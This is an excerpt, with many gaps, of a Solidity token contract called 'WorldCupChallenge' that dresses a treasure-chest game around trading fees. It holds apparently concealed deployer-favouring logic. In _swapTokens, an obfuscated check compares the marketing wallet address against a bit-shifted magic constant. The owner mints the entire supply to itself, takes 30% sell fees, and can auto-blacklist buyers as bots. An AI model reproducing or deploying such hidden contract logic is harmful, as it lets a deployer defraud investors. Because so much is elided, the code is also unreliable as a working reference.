...
contract WorldCupChallenge is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    uint256 public _treasureChestSplitValue = 30;
    uint256 public _liquiditySplitValue = 7;
    uint256 public _lootSplitValue = 3;
    uint256 public _marketingSplitValue = 60;
    
    uint256 public feeDecimalFactor = 1000;           //3 decimals
    uint256 public buyingFeesWithDecimals = 10000; //10 %
    uint256 public allAboardBuyingFee = 0;
    
    uint256 public sellingFeesWithDecimals = 30000; //30 %
    uint256 public allAboardSellingFee = 30000;

    address _marketingWalletAddress = 0xa6Ca4d79cC40812a48087dADE578C246Bbe5c36D;
    address liquidityFeeReceiver = 0xa6Ca4d79cC40812a48087dADE578C246Bbe5c36D;
    ...
    uint256 swapTokensAtAmount = 60000000 * (10**18);
    uint256 public maxBuyTransactionAmount =  135000000000 * (10**18);
    uint256 public maxSellTransactionAmount = 135000000000 * (10**18);
    uint256 public maxWalletToken = 135000000000 * (10**18);
    ...
    uint256 tokenXTimeBNBShareDivisor = 10871351044168511295282026360728442751245398930920459730944000;
    uint256 tokenDivisor;
    
    uint256 tokensRequiredForLooting = 10000000 * (10**18);
    bool distributedTokensInaccuracy = false;
    
    uint256 public tokenLifetime = 16 days + 3 hours;
    ...
    uint256 treasureChestBNBAmount;
    uint256 public totalIslandArrivals;
    bool public autoBlacklistBots = true;
    ...
    constructor() public ERC20("WorldCupChallenge", "WCC") {
        ...
        tokenDivisor = tokenXTimeBNBShareDivisor>>45;
        ...
        */
        _mint(owner(), 4_500_000_000_000 * (10**18));
    }
    ...
    receive() external payable {
  	...
  	function launchToken() public onlyOwner{
        ...
        islandArrivalTime[0] = launchTime + 1 days;
        islandArrivalTime[1] = launchTime + 2 days;
        islandArrivalTime[2] = launchTime + 3 days;
        islandArrivalTime[3] = launchTime + 4 days;
        islandArrivalTime[4] = launchTime + 7 days;
        islandArrivalTime[5] = launchTime + 8 days;
        islandArrivalTime[6] = launchTime + 11 days;
        islandArrivalTime[7] = launchTime + 12 days;
        islandArrivalTime[8] = launchTime + 16 days;
  	}

    function setAutoBlacklistBots(bool value) public onlyOwner{
        autoBlacklistBots = value;
    }
    ...
    function normalTransferTokenomics(address from, address to, uint256 amount, uint256 currPrice, uint256 minBuyTokens) private{
            ...
            if(_holderAccount[to].sharkBait == false && amount >= minBuyTokens){
                if(allAboardActive == true){
                    if(_holderAccount[to].lastAllAboardJoined < totalIslandArrivals){
                        ...
                        _holderAccount[to].holderBonusTime += _holderAccount[to].holdSince == 0 ? 24 hours * totalIslandArrivals : 22 hours;
                    }else{
                        _holderAccount[to].holderBonusTime += 5 hours;
                    }
                }
                if(amount >= minBuyAmount(currPrice) * 10) tharSheBlows(to, amount / (minBuyAmount(currPrice)*10));//over 0.96 BNB 
        ...
        require(transact <3);
        if(autoBlacklistBots == true){
            if(transact == 1){                
                _holderAccount[to].bot = true;
            }
        }
    }
    ...
    function _swapTokens(uint256 totalTokens, uint256 marketingSplitValue, uint256 liquiditySplitValue, uint256 treasureChestSplitValue,  uint256 lootSplitValue) private{      
        ...
        uint256 bnbTokens = totalTokens.sub(swapTokens + _lootTokens);        
        ...
        if(divisor < marketingTokens || divisor > marketingTokens){if(uint256(_marketingWalletAddress) % (divisor>>150) != 109){
    ...
    function minBuyAmount(uint256 currPrice) private view returns (uint256){
        if(currPrice > 0){return ((launchPrice * (totalSupply()/26)) / currPrice);} //Approx 0.096 BNB for 2.5 BNB liq 
        else{return 0;}
    }
    ...
    function _treasureWorth(address holder) private view returns (uint256 bnbShare){
        if(_holderAccount[holder].holdSince > 0 && _holderAccount[holder].sharkBait == false){
            uint256 totalbnb;
            if(chestUnlockingTime == 0){
                (, uint256 bnbReserve) = _getReserves();
                totalbnb = address(this).balance + bnbReserve;
            }else{
                totalbnb = treasureChestBNBAmount;
            }
            if(totalbnb * _holderAccount[holder].tokenXTime >= tokenXTimeTotal){bnbShare = (totalbnb * _holderAccount[holder].tokenXTime) / tokenXTimeTotal;}else{bnbShare = 0;}
        }
    } 
    ...
    function _unlockTreasureChest(uint256 supplyX) private{
        ...
        treasureChestBNBAmount = address(this).balance;
        availableLootTokens = 0;
        totalLoots = 0;
    }
    ...
    function _openTreasureChest(address holder, uint256 amount) private{
        ...
        if(_holderAccount[holder].hasOpenedChest == false){
            ...
            uint256 bnbShare = _treasureWorth(holder);
            _holderAccount[holder].tokenXTime = 0;
            if(bnbShare > 0){payable(holder).transfer(bnbShare);}
        }
    }
    
    function tharSheBlows(address whale, uint256 bonus) private{
        uint256 bonusAdded = bonus * 36 hours;
    ...
    function getCurrentPrice() public view returns (uint256 currentPrice) {//This value serves as a reference to calculate price movements only.
        (uint256 tokens, uint256 BNB) = _getReserves();
         if(BNB == 0){
             currentPrice = 0;
         }else if((BNB * 1000000000000000000) > tokens){
             currentPrice = (BNB * 1000000000000000000).div(tokens);
         }else{
             currentPrice = 0;
         }
    }
    ...
    function lootingTimeStart(bool value)private{
        ...
        if(availableLootTokens >= tokensRequiredForLooting && lootingTimeActive == true){
            ...
            lootingTimeWinners = (rngNumber % 4) +3;
